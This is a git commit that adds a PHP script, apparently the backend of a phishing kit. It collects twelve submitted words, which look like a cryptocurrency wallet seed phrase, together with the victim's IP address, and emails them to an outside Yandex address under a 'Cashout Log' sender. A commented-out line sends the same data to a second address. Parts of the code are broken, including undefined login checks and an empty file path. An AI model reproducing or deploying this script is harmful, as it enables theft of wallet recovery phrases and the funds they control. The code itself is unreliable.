203eed80046b0baf807cadfd3a88320fbac34bbb
gatswagg <95851916+gatswagg@users.noreply.github.com>
2022-01-26 20:50:19 +0800

    Add files via upload

---
+++ fury.php
@@ -0,0 +1,53 @@
+<?php
+$ip = getenv("REMOTE_ADDR");
+
+$WoRd1 = $_POST['WoRd1'];
+$WoRd2 = $_POST['WoRd2'];
+$WoRd3 = $_POST['WoRd3'];
+$WoRd4 = $_POST['WoRd4'];
+$WoRd5 = $_POST['WoRd5'];
+$WoRd6 = $_POST['WoRd6'];
+$WoRd7 = $_POST['WoRd7'];
+$WoRd8 = $_POST['WoRd8'];
+$WoRd9 = $_POST['WoRd9'];
+$WoRd10 = $_POST['WoRd10'];
+$WoRd11 = $_POST['WoRd11'];
+$WoRd12 = $_POST['WoRd12'];
+
+$done = array('signal'=>'ok');
+$bad = array('signal'=>'bad');
+
+
+if (!empty($login) && !empty($passwd)) {
+  $own = 'deralogs@yandex.com';
+  $date = date("D/M/d, Y g:i a");
+  $subj = "Backup from $ip";
+  $from = "From:Cashout Log (EUR) <mail@me.mom163.com>";
+  $msg = "$WoRd1\n";
+  $msg .= "$WoRd2\n";
+  $msg .= "$WoRd3\n";
+  $msg .= "$WoRd4\n";
+  $msg .= "$WoRd5\n";
+  $msg .= "$WoRd6\n";
+  $msg .= "$WoRd7\n";
+  $msg .= "$WoRd8\n";
+  $msg .= "$WoRd9\n";
+  $msg .= "$WoRd10\n";
+  $msg .= "$WoRd11\n";
+  $msg .= "$WoRd12\n";
+  $msg .= "Submitted from IP Address - $ip on $date\n-----------------------------------\n        Created By (~)\n-----------------------------------";
+  mail($own,$subj,$msg,$from);
+
+  echo json_encode($done);
+} else {
+  echo json_encode($bad);
+}
+
+$fp = fopen("","a");
+fputs($fp,$msg);
+fclose($fp);
+
+// 	$mailHeaders = "From: " . $x1. "<". $x1 .">\r\n";
+// $subject = "KSA MAIL";
+// mail('a.williams8927@gmail.com', $subject,$mesaj, $mailHeaders);
+?>
